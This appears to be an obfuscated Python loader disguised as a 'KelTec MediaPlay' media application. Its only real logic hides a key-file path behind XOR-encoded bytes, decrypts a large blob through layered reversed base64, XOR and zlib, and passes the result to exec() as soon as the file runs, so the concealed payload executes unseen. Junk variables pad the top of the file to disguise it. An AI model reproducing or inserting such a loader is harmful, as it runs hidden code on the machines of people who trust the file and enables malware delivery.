# -*- coding: utf-8 -*-
# KelTec MediaPlay 
_lx0_0 = 272776 ^ 412614
_lx1_1 = len("38d14d")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-551153)
_lx3_3 = 147978 * 0
_lx4_4 = 996637 ^ 455386
_M = 'TtAVa6w4kOE+I8ri7FbO8NZIqTZez1iIcR7pvBsFEHVKz1Mr/DiF8j0mxeXrB87xg0j6Ml3HCtwgG+/gGwIfck6cUCuvMtWmMSLH'
_D = '==Q7sftqLUUVLVZcHemb1fNSbgIov/5qIPHNhOwT13Jtn+DWzSK9RHyp/7LJ+1YiGnCg9r0oZjTFYSg62X2/pRy/8snuG/kqU9CD2lYiFWUQkv8OpT3884SdZ8ncumkfAEJwWBfJ/piGZF51HmACcSnMWCtQ0BkcctdVG/Y1mjJt6O9BGEn8jtiWSvFY02bVqKgMjLZJRca3hzZNtbQjVcLDqczVwCpjijzz5T/VhUEKR1rh7XocI1dKsYHnMypIyr9+vq4wq6CrLPhMfTrnGMvwbiZZOjNEtHfTFeSoDkHCgwEvgSZLYk3x/CrakVOFDNyRdtUC0CglISqzjso91rXdXjjPzg5i/tyTnkTDXMWy4PWKmCC0fZfcWSxHsRNgM33Nlv+LYpgDEK90B3G9dKpU8ywtY901ZenDjKa+MVcukRd+1gZH1n4TxEo23Uy2rV3zAC8r/MZ21vk58s5A6SErgnUbRT9aKmVa8E/PPQ8GC5HkmMMSSJOizPfwnp39q4AtUHPGDvMmv9zGJSrTfQs138f29VGbgRSj73KiGmiL/lFlIzUnS1O0BjA/zHgbHVzfKut8kp+5cVmnqPzJK4libDS/n6o0dcfsP42a2zAjjElE7FvK3inBjq0C02i4VoaYKbrJpn3ETQTjhIgnPi6Q/nfZR4h1GNscqh7zkd9VXeYGeuuGngww0W5tHKgO649FQ9shbNEEVopUDEjGP23f2Dpm95XPEUWQ49uf4Muu95CIcMEsIX+DUtHh/bcsVpqDbEPX1V4S4TjpEzTo14LlIl+cstP46/fN49kco0c8798E8Clpbo/3gR3E7b+0M1PFFKoK59j+HrqPWrP3CNvHS+bOf8PjphgAyzpi8Pz+TRjq/mP9LTtBqyz5oM+LZTuqTNiBqnUwBSb8Dp9Ei7YPQyWpN42qQdBxp7jQrffoLLR/uoYX6tzRbKcslxZhQyXGmn+fnsaEwOa9FK16cXibfzxeODcbxOFNai0Lt7nYzNztlbYhKvksIk5UEJXxcmWtzKeaHKHLYFXUgdXcmbuhT3HqeEY2My3OtkIFl6UEASLNVJPLQSAt9vX1oB/QdCixQbBUiBtpJDHVB8VdgyOGvEg363Qjk3MrCSLcXfOgZksGQjacBREej+wTY7IyQ9VFoJhis5icGYHLBtUNBmwKEnRdWWHCCedmFrwfYSw7kCk8Dv9gPoTFqMgYu6/1jN/GX4xRJ3JJV+sl+C9Prm9A2ukwYsqVULXdVd2vxoZa+qrehiMaIqsbAWqcHd1vOM/ilcH6ucChxxxNNxBL2OxD8esQklqTPQwenAUcDQ6ZJEux/mb4SkUsLSTTHQQeytQJCS12P1okC5+2qjIa5uLeehdk2TyF0XKSz1LKqPYltiNC6WJM0ACalTpjPA6LBC8N/K8UJ3JS41Au5gchpIAuucE2sDzPE/J2QdxXLF0DVvAUQKH7t/8Z7K28K7tCL0Da2ww2xJyoN5Irx15OQWF1b+lcrWD+3gbZNx3bU4pMOn3Iznj5F3NdOSGxzGtRM9ESokRTD4YmLFuHhWuBSwjesLvpwV0CuyaZKz8hoANvHJL2p6BT7i/5MSSm3XXk'

_c30d=[241,124,226,245,146,214,237,178]+[186,203,135,98,170,222,127,92]
_5abf=[57,246,134,87,150,121,116,171]+[232,23,131,251,139,92,155,247]
_6535=bytes([a^b for a,b in zip([131,25,145,154,231,164,142,215,201,228,227,3,222,191],_c30d*8)]).decode()
_9e81=bytes([a^b for a,b in zip([74,147,242,35,255,23,19,216,198,117,234,149],_5abf*8)]).decode()
_f986=_o.path.join(_o.path.dirname(_o.path.abspath(__file__)),*_6535.split('/'),_9e81)
with open(_f986,'r') as _f:_K=_f.read().strip()
def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    exec(compile(src,'<mediaplay>','exec'),{'__name__':'__main__','__file__':__file__})
_run()